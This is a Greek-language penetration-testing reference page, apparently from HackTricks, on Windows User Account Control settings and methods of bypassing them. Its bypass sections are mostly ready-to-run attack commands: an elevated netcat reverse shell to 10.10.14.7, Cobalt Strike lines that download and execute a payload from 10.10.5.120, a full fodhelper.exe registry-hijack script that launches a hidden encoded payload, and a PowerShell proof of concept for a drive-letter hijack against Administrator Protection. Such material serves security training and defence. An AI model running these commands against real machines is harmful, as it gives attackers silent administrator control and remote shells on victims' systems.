# UAC - Έλεγχος Λογαριασμού Χρήστη

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που ενεργοποιεί μια **προτροπή συναίνεσης για ενέργειες με αυξημένα δικαιώματα**. Οι εφαρμογές έχουν διαφορετικά `integrity` επίπεδα, και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν ενδεχομένως να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες πάντα **τρέχουν υπό το πλαίσιο ασφαλείας ενός λογαριασμού μη-διαχειριστή** εκτός αν ένας διαχειριστής ρητά εξουσιοδοτήσει αυτές τις εφαρμογές/εργασίες να έχουν επίπεδο πρόσβασης διαχειριστή για να τρέξουν. Είναι μια λειτουργία ευκολίας που προστατεύει τους διαχειριστές από ακούσιες αλλαγές αλλά δεν θεωρείται όριο ασφάλειας.

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν το UAC εφαρμόζεται, ένας χρήστης διαχειριστής λαμβάνει 2 tokens: ένα token τυπικού χρήστη, για να εκτελεί κανονικές ενέργειες σε κανονικό επίπεδο, και ένα με τα προνόμια διαχειριστή.

Αυτή η [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) συζητά σε βάθος πώς λειτουργεί το UAC και περιλαμβάνει τη διαδικασία σύνδεσης, την εμπειρία χρήστη και την αρχιτεκτονική του UAC. Οι διαχειριστές μπορούν να χρησιμοποιήσουν πολιτικές ασφαλείας για να ρυθμίσουν πώς λειτουργεί το UAC ειδικά για την οργάνωσή τους σε τοπικό επίπεδο (using secpol.msc), ή να το διαμορφώσουν και να το προωθήσουν μέσω Group Policy Objects (GPO) σε περιβάλλον Active Directory domain. Οι διάφορες ρυθμίσεις περιγράφονται αναλυτικά [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 Group Policy ρυθμίσεις που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει επιπλέον λεπτομέρειες:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Απενεργοποιημένο                                             |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Απενεργοποιημένο                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Ζήτηση συναίνεσης για μη-Windows binaries                    |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Ζήτηση διαπιστευτηρίων στην ασφαλή επιφάνεια εργασίας         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Ενεργοποιημένο (προεπιλογή για home) Απενεργοποιημένο (προεπιλογή για enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Απενεργοποιημένο                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Ενεργοποιημένο                                               |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Ενεργοποιημένο                                               |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Ενεργοποιημένο                                               |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Ενεργοποιημένο                                               |

### Θεωρία παράκαμψης UAC

Κάποιες εφαρμογές **ανυψώνονται αυτόματα** αν ο χρήστης **ανήκει** στην **ομάδα διαχειριστών**. Αυτά τα binaries έχουν στα _**Manifests**_ την επιλογή _**autoElevate**_ με τιμή _**True**_. Το binary πρέπει επίσης να είναι **υπογεγραμμένο από τη Microsoft**.

Πολλές διαδικασίες που αυτο-ανυψώνονται εκθέτουν **λειτουργικότητα μέσω COM objects ή RPC servers**, τα οποία μπορούν να κληθούν από διεργασίες που τρέχουν με medium integrity (κανονικά προνόμια χρήστη). Σημειώστε ότι τα COM (Component Object Model) και RPC (Remote Procedure Call) είναι μέθοδοι που χρησιμοποιούν τα προγράμματα Windows για να επικοινωνούν και να εκτελούν λειτουργίες ανάμεσα σε διαφορετικές διεργασίες. Για παράδειγμα, το **`IFileOperation COM object`** έχει σχεδιαστεί για να χειρίζεται λειτουργίες αρχείων (αντιγραφή, διαγραφή, μετακίνηση) και μπορεί να ανυψώσει προνόμια αυτόματα χωρίς προτροπή.

Σημειώστε ότι μπορεί να γίνονται κάποιοι έλεγχοι, όπως αν η διαδικασία εκτελέστηκε από τον κατάλογο **System32**, οι οποίοι μπορούν να παρακαμφθούν, για παράδειγμα, με **injection στο explorer.exe** ή σε κάποιο άλλο εκτελέσιμο που βρίσκεται στο System32.

Μια άλλη μέθοδος για να παρακαμφθούν αυτοί οι έλεγχοι είναι να **τροποποιηθεί το PEB**. Κάθε διαδικασία στα Windows έχει ένα Process Environment Block (PEB), που περιλαμβάνει σημαντικά δεδομένα για τη διαδικασία, όπως το εκτελέσιμο μονοπάτι της. Με την τροποποίηση του PEB, οι επιτιθέμενοι μπορούν να πλαστογραφήσουν (spoof) τη θέση της κακόβουλης διαδικασίας τους, κάνοντάς την να φαίνεται ότι τρέχει από έναν αξιόπιστο κατάλογο (π.χ. system32). Αυτή η πλαστή πληροφορία ξεγελά το COM object ώστε να ανυψώσει προνόμια χωρίς να ζητήσει προτροπή από τον χρήστη.

Έτσι, για να **παρακαμφθεί** το **UAC** (ανύψωση από **medium** επίπεδο `integrity` **σε high**) κάποιοι επιτιθέμενοι χρησιμοποιούν αυτού του είδους τα binaries για να **εκτελέσουν αυθαίρετο κώδικα**, επειδή θα εκτελεστεί από μια διεργασία με **High level integrity**.

Μπορείτε να **ελέγξετε** το _**Manifest**_ ενός binary χρησιμοποιώντας το εργαλείο _**sigcheck.exe**_ από τα Sysinternals. (`sigcheck.exe -m <file>`) Και μπορείτε να **δειτε** το **επίπεδο integrity** των διεργασιών χρησιμοποιώντας το _Process Explorer_ ή το _Process Monitor_ (από τα Sysinternals).

### Έλεγχος UAC

Για να επιβεβαιώσετε αν το UAC είναι ενεργοποιημένο κάντε:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Αν είναι **`1`** τότε το UAC είναι **ενεργοποιημένο**, αν είναι **`0`** ή δεν υπάρχει, τότε το UAC είναι **απενεργοποιημένο**.

Στη συνέχεια, ελέγξτε **ποιο επίπεδο** είναι ρυθμισμένο:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)  
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)  
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)  
- If **`3`** like `1` but not necessary on Secure Desktop  
- If **`4`** like `2` but not necessary on Secure Desktop  
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Έπειτα, πρέπει να κοιτάξετε την τιμή του **`LocalAccountTokenFilterPolicy`**\  
Αν η τιμή είναι **`0`**, τότε μόνο ο χρήστης **RID 500** (**Built-in Administrator**) μπορεί να εκτελεί **εργασίες διαχειριστή χωρίς UAC**, και αν είναι `1`, **όλοι οι λογαριασμοί μέσα στην ομάδα "Administrators"** μπορούν να το κάνουν.

Και, τέλος, δείξτε την τιμή του κλειδιού **`FilterAdministratorToken`**\  
Αν είναι **`0`** (default), ο λογαριασμός **Built-in Administrator** μπορεί να εκτελεί απομακρυσμένες εργασίες διαχείρισης και αν είναι **`1`** ο λογαριασμός Built-in Administrator **δεν μπορεί** να εκτελεί απομακρυσμένες εργασίες διαχείρισης, εκτός αν το `LocalAccountTokenFilterPolicy` είναι ρυθμισμένο σε `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

Μπορείτε επίσης να ελέγξετε τις ομάδες του χρήστη σας και να λάβετε το επίπεδο ακεραιότητας:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε γραφική πρόσβαση στο θύμα, το UAC bypass είναι απλό καθώς μπορείτε απλώς να κάνετε κλικ στο "Yes" όταν εμφανιστεί το παράθυρο UAC

Το UAC bypass απαιτείται στην εξής περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε περιβάλλον μέσου επιπέδου ακεραιότητας και ο χρήστης σας ανήκει στην ομάδα διαχειριστών**.

Είναι σημαντικό να αναφέρουμε ότι είναι **πολύ πιο δύσκολο να παρακάμψετε το UAC αν αυτό βρίσκεται στο υψηλότερο επίπεδο ασφάλειας (Always) απ' ό,τι αν βρίσκεται σε κάποιο από τα άλλα επίπεδα (Default).**

### UAC απενεργοποιημένο

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**) μπορείτε να **εκτελέσετε ένα reverse shell με δικαιώματα διαχειριστή** (υψηλού επιπέδου ακεραιότητας) χρησιμοποιώντας κάτι σαν:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** Βασικό UAC "bypass" (πλήρης πρόσβαση στο σύστημα αρχείων)

Αν έχετε ένα shell με έναν χρήστη που ανήκει στην ομάδα Administrators, μπορείτε να **mount the C$ shared via SMB** τοπικά ως νέο δίσκο και θα έχετε **πρόσβαση σε ολόκληρο το σύστημα αρχείων** (ακόμη και στον προσωπικό φάκελο του Administrator).

> [!WARNING]
> **Φαίνεται ότι αυτό το κόλπο δεν λειτουργεί πλέον**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass με cobalt strike

Οι τεχνικές Cobalt Strike θα λειτουργήσουν μόνο εάν το UAC δεν έχει ρυθμιστεί στο μέγιστο επίπεδο ασφάλειας.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και **Metasploit** έχουν επίσης αρκετά modules για να **bypass** την **UAC**.

### KRBUACBypass

Τεκμηρίωση και εργαλείο στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) που είναι μια **συλλογή** από αρκετές UAC bypass exploits. Σημειώστε ότι θα χρειαστεί να **compile UACME using visual studio or msbuild**. Η μεταγλώττιση θα δημιουργήσει αρκετά εκτελέσιμα (όπως `Source\Akagi\outout\x64\Debug\Akagi.exe`) , θα χρειαστεί να γνωρίζετε **ποιο χρειάζεστε.**\
Θα πρέπει να **προσέξετε** γιατί κάποια bypasses θα **προκαλέσουν κάποια άλλα προγράμματα** που θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας [this](https://en.wikipedia.org/wiki/Windows_10_version_history) σελίδα παίρνετε την έκδοση Windows `1607` από τις εκδόσεις build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Το αξιόπιστο binary `fodhelper.exe` είναι auto-elevated σε σύγχρονα Windows. Κατά την εκτέλεσή του, διαβάζει τη διαδρομή μητρώου ανά-χρήστη παρακάτω χωρίς να επικυρώνει το `DelegateExecute` verb. Τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διαδικασία Medium Integrity (ο χρήστης είναι στους Administrators) να εκκινήσει μια διαδικασία High Integrity χωρίς εμφάνιση προτροπής UAC.

Διαδρομή μητρώου που ρωτάει το fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell βήματα (ορίστε το payload σας, στη συνέχεια ενεργοποιήστε):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο UAC είναι το προεπιλεγμένο/χαλαρό (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να ξεκινήσετε ένα 64-bit PowerShell από μια 32-bit process σε 64-bit Windows.
- Το payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd, ή μια διαδρομή EXE). Αποφύγετε UI που ζητούν επιβεβαίωση για διακριτικότητα.

#### More UAC bypass

**Όλες** οι τεχνικές που χρησιμοποιούνται εδώ για να παρακάμψουν το AUC **απαιτούν** ένα **πλήρες διαδραστικό shell** με το θύμα (ένα κοινό nc.exe shell δεν είναι αρκετό).

Μπορείτε να το αποκτήσετε χρησιμοποιώντας μια **meterpreter** session. Μεταναστεύστε σε μια **process** που έχει την τιμή **Session** ίση με **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να δουλεύει)

### Παράκαμψη UAC με GUI

Εάν έχετε πρόσβαση σε GUI, μπορείτε απλά να αποδεχτείτε το UAC prompt όταν εμφανιστεί — δεν χρειάζεστε πραγματικά παράκαμψη. Επομένως, η πρόσβαση σε GUI θα σας επιτρέψει να παρακάμψετε το UAC.

Επιπλέον, αν αποκτήσετε μια GUI session που κάποιος χρησιμοποιούσε (π.χ. μέσω RDP), υπάρχουν **κάποια εργαλεία που θα τρέχουν ως administrator** από τα οποία μπορείτε να **εκτελέσετε** ένα **cmd** για παράδειγμα **ως admin** απευθείας χωρίς να σας ζητήσει ξανά το UAC, όπως [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **διακριτικό**.

### Noisy brute-force UAC bypass

Αν δεν σας απασχολεί ο θόρυβος, μπορείτε πάντα να **τρέξετε κάτι σαν** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που **ζητά να αυξηθούν τα δικαιώματα μέχρι ο χρήστης να τα αποδεχτεί**.

### Your own bypass - Basic UAC bypass methodology

Αν ρίξετε μια ματιά στο **UACME** θα παρατηρήσετε ότι **οι περισσότερες παρακάμψεις UAC εκμεταλλεύονται μια ευπάθεια Dll Hijacking** (κυρίως γράφοντας τη κακόβουλη dll στο _C:\Windows\System32_). [Διαβάστε αυτό για να μάθετε πώς να βρείτε μια ευπάθεια Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρείτε ένα binary που θα **autoelevate** (ελέγξτε ότι όταν εκτελείται τρέχει σε high integrity level).
2. Με το procmon βρείτε γεγονότα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψετε** το DLL μέσα σε κάποιες **protected paths** (όπως C:\Windows\System32) όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να παρακάμψετε αυτό χρησιμοποιώντας:
1. **wusa.exe**: Windows 7,8 και 8.1. Σας επιτρέπει να εξάγετε το περιεχόμενο ενός CAB αρχείου μέσα σε protected paths (επειδή αυτό το εργαλείο εκτελείται σε high integrity level).
2. **IFileOperation**: Windows 10.
4. Προετοιμάστε ένα **script** για να αντιγράψετε τη DLL μέσα στη protected path και να εκτελέσετε το ευάλωτο και autoelevated binary.

### Άλλη τεχνική παράκαμψης UAC

Συνίσταται στο να παρακολουθείτε αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **name/path** ενός **binary** ή **command** που θα **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτή την πληροφορία μέσα στο **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Τα Windows 11 25H2 “Administrator Protection” χρησιμοποιούν shadow-admin tokens με per-session `\Sessions\0\DosDevices/<LUID>` maps. Ο φάκελος δημιουργείται τεμπέλικα από το `SeGetTokenDeviceMap` στην πρώτη επίλυση του `\??`. Αν ο επιτιθέμενος μιμηθεί το shadow-admin token μόνο στο επίπεδο **SecurityIdentification**, ο φάκελος δημιουργείται με τον επιτιθέμενο ως **owner** (κληρονομεί `CREATOR OWNER`), επιτρέποντας drive-letter links που έχουν προτεραιότητα έναντι του `\GLOBAL??`.

**Βήματα:**

1. Από μια low-privileged συνεδρία, καλέστε το `RAiProcessRunOnce` για να δημιουργήσετε ένα shadow-admin `runonce.exe` χωρίς prompt.
2. Αντιγράψτε το primary token του σε ένα **identification** token και μιμηθείτε το ενώ ανοίγετε `\??` για να αναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` υπό ιδιοκτησία του επιτιθέμενου.
3. Δημιουργήστε εκεί ένα `C:` symlink που δείχνει σε αποθηκευτικό χώρο ελεγχόμενο από τον επιτιθέμενο. Οι επόμενες προσβάσεις στο filesystem σε αυτή τη συνεδρία επιλύουν το `C:` στην πορεία του επιτιθέμενου, επιτρέποντας DLL/file hijack χωρίς prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Αναφορές
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – Πώς λειτουργεί το User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – Συλλογή τεχνικών UAC bypass](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
